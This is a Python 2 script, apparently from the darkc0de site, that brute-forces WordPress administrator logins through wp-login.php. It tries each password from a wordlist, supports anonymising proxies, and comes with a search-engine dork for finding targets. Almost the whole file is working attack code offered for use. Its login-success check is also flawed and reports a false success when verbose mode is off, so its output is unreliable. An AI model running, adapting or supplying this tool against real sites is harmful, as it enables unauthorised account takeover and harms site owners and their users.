#!/usr/bin/python
#WordPress Brute Force (wp-login.php)

#If cookies enabled brute force will not work (yet)
#Change response on line 97 if needed. (language)

#Dork: inurl:wp-login.php

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com 

import urllib2, sys, re, urllib, httplib, socket

print "\n   d3hydr8[at]gmail[dot]com WordPressBF v1.0"
print "----------------------------------------------"

if len(sys.argv) not in [4,5,6,7]:
	print "Usage: ./wordpressbf.py <site> <user> <wordlist> <options>\n"
	print "\t   -p/-proxy <host:port> : Add proxy support"
	print "\t   -v/-verbose : Verbose Mode\n"
	sys.exit(1)
	
for arg in sys.argv[1:]:
	if arg.lower() == "-p" or arg.lower() == "-proxy":
		proxy = sys.argv[int(sys.argv[1:].index(arg))+2]
	if arg.lower() == "-v" or arg.lower() == "-verbose":
		verbose = 1
		
try:
	if proxy:
		print "\n[+] Testing Proxy..."
		h2 = httplib.HTTPConnection(proxy)
		h2.connect()
		print "[+] Proxy:",proxy
except(socket.timeout):
	print "\n[-] Proxy Timed Out"
	proxy = 0
	pass
except(NameError):
	print "\n[-] Proxy Not Given"
	proxy = 0
	pass
except:
	print "\n[-] Proxy Failed"
	proxy = 0
	pass
	
try:
	if verbose == 1:
		print "[+] Verbose Mode On\n"
except(NameError):
	print "[-] Verbose Mode Off\n"
	verbose = 0
	pass
	
if sys.argv[1][:7] != "http://":
	host = "http://"+sys.argv[1]
else:
	host = sys.argv[1]
	
print "[+] BruteForcing:",host
print "[+] User:",sys.argv[2]

try:
  	words = open(sys.argv[3], "r").readlines()
  	print "[+] Words Loaded:",len(words),"\n"
except(IOError): 
  	print "[-] Error: Check your wordlist path\n"
  	sys.exit(1)
  
for word in words:
	word = word.replace("\r","").replace("\n","")
	login_form_seq = [
     	('log', sys.argv[2]),
     	('pwd', word),
     	('rememberme', 'forever'),
     	('wp-submit', 'Login >>'),
		('redirect_to', 'wp-admin/')]
	login_form_data = urllib.urlencode(login_form_seq)
	if proxy != 0:
		proxy_handler = urllib2.ProxyHandler({'http': 'http://'+proxy+'/'})
		opener = urllib2.build_opener(proxy_handler)
	else:
		opener = urllib2.build_opener()
	try:
		site = opener.open(host, login_form_data).read()
	except(urllib2.URLError), msg:
		print msg
		site = ""
		pass

	if re.search("WordPress requires Cookies",site):
		print "[-] Failed: WordPress has cookies enabled\n"
		sys.exit(1)
		
	#Change this response if different. (language)
	if re.search("<strong>ERROR</strong>",site) and verbose == 1:
		print "[-] Login Failed:",word
	else:
		print "\n\t[!] Login Successfull:",sys.argv[2],word,"\n"
		sys.exit(1)
print "\n[-] Brute Complete\n"
	